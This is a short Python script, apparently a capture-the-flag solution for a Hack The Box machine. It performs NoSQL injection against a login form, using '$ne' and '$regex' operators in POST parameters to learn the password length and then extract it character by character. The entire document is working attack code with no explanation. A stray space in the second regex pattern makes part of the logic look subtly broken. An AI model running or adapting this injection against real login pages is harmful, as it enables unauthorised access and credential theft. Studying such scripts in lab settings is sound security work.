import requests

chars="qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!_@-#"
url = "http://staging-order.mango.htb/"
size = 0

while True:
    forge = ".{"+str(size)+"}"
    req = {'username[$ne]':'admin','password[$regex]':forge,'login':'login'}
    result = requests.post(url,data=req)
    if "Log in for ordering Sweet & Juicy Mango." in result.text :
        break
    size=size+1

size=size-1
print("[+]Extracting password with size:"+str(size)+"!Hold tight")
password = ""

l=0

while l != size:
    for char in chars:
        data = {"username[$ne]":"admin","password[$regex]":password+char+". {"+str(size-len(password)-1)+"}","login":"login"}
        r=requests.post(url,data=data)
        if "Log in for ordering Sweet & Juicy Mango." not in r.text:
            password+=char
            print("[+]Hit: "+char,end="")
            break
    l+=1
print(password)
